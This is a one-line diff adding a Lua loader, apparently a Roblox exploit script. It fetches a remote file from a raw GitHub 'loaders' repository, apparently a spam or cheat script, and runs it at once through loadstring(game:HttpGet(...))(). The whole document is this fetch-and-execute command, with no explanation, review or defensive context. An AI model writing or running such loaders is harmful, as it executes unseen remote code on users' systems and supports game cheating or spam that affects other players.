@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/interrogation-ai-spam6-cpf9xc7ygxy9nv.lua"))()
